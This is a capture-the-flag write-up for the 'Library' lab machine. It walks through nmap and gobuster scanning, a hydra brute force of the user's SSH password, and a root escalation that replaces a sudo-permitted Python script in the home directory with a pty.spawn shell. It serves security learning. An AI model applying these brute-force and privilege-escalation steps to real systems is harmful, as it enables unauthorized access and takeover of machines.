<h1 align="center">Challenge 057 - Library </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/5ae48fa6-40e8-4cbb-909b-0b800f2b2211" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: 1/10 (Easy) <b>Completed</b>: ✔️ 24.11.2025 </p>

This is another Web Exploitation challenge with some boot to root on top. I hope I have built up enough practiced to solve this kind of box. Let's learn some new things.

## user.txt

After deploying the machine we do the nmap scan.

```
root@ip-10-80-92-7:~# nmap -sV -p- -A 10.80.174.91
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-24 14:51 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.80.174.91
Host is up (0.00065s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/24%OT=22%CT=1%CU=37440%PV=Y%DS=1%DC=T%G=Y%TM=692471
OS:24%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2
OS:301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=6
OS:8DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT     ADDRESS
1   0.57 ms 10.80.174.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.06 seconds
```

There are exactly 2 ports open. The one for http (80) and the one for ssh (22). Pretty much what you would expect from this challenge. Let's check out the web page.

<img width="1134" height="763" alt="grafik" src="https://github.com/user-attachments/assets/b46249f1-ee3a-4ee1-8707-a72d5b890bb0" />

There is a post that was done by a user called meliodas. That's one known username we could use to login in ssh.

Hovering down the page we also seem to be able to post a comment. There may be RCE that we can abuse through that. Or so I thought, but the importance of testing out functionality of a web page really made clear that this was also just placeholder assets that we wouldn't be able to exploit.

<img width="536" height="376" alt="Bildschirmfoto vom 2025-11-24 16-04-01" src="https://github.com/user-attachments/assets/6272d48f-285f-4943-acfc-b9bf5513c4e3" />

Nmap also already revealed a robots.txt directory. Let's see what directory is disallowed to be visited.

<img width="166" height="51" alt="grafik" src="https://github.com/user-attachments/assets/830bd2ae-44a4-4d7d-b737-217c02e8444c" />

This didn't help much. Let's just try to use gobuster

```
root@ip-10-80-92-7:~# gobuster dir -u 10.80.174.91 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.174.91
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/images               (Status: 301) [Size: 313] [--> http://10.80.174.91/images/]
/index.html           (Status: 200) [Size: 5439]
/robots.txt           (Status: 200) [Size: 33]
/server-status        (Status: 403) [Size: 300]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

I made sure to check out the /images directory but it didn't contain anything interesting whatsoever. I was not really sure what to do, but remembered that I at least knew the username of meliodas and that the rockyou.txt file should be disallowed in all the directories of said IP-address. Maybe we could try to run hydra and figure out a ssh password that way.

```
root@ip-10-80-92-7:~# hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.80.174.91
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-24 15:43:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.80.174.91:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344222 to do in 1343:06h, 16 active
[22][ssh] host: 10.80.174.91   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-24 15:45:09
```

I was a little surprised that that actually worked out. I really thought we would have to work with XSS. Regardless we used these credentials to log in now

```
root@ip-10-80-92-7:~# ssh meliodas@10.80.174.91
The authenticity of host '10.80.174.91 (10.80.174.91)' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.80.174.91' (ECDSA) to the list of known hosts.
meliodas@10.80.174.91's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
```

After successfully logging in we can finally cat the user.txt file.

<img width="677" height="313" alt="Bildschirmfoto vom 2025-11-24 16-53-06" src="https://github.com/user-attachments/assets/949b2462-be1e-497b-b060-1e03e209088a" />

That takes care of the first half of the assignment.

## root.txt
To figure out how we can escalate privileges I just checked which commands could be run as sudo.

```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

Seems like we have a python file, we could maybe modify to run shell commands as root. I checked out the source code to see, if we could use its content to our advantage.

```
meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

The provided Python script zips the content of a specified directory. It defines a function zipdir that traverses a given directory path (/var/www/html) and adds all its files to a ZIP file. I tried modifying the python file but quickly realized I just didn't have the permissions to do such an operation. Out of frustration I just decided to write my own file and remove the prior one.

```
meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? y
```

Now it was time to write my very own bak.py file 

```
meliodas@ubuntu:~$ echo 'import pty; pty.spawn("/bin/sh")'>/home/meliodas/bak.py
meliodas@ubuntu:~$ ls
bak.py  bak.py.save  user.txt
```

We use the echo command to create a new Python script in the /home/meliodas/ directory. The command writes a string into the file that should spawn a new shell session, when executed. Let's try it out.

```
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
# whoami
root
```

There we go. After that we just had to look up the root directory and cat the root.txt file. Nothing extraordinary.

<img width="680" height="277" alt="Bildschirmfoto vom 2025-11-24 18-43-54" src="https://github.com/user-attachments/assets/3f946bf0-b847-46da-b0a5-32a80ce54a84" />

## Lesson Learned
In this box the importance of always keeping an eye on existing usernames on the target machine - while very obious - still was something I still had to really internalize. After this CTF I will surely never forget this again. 

I also learned that if there is a python file in a specific directory that we are able to run as sudo, we just can delete the existing file and create our own version of it since we have the permission to run ANY Python file with that exact name in that location with sudo without a password. This can potentially allow us to gain shell access or perform other actions as root, depending on what we write in the script.
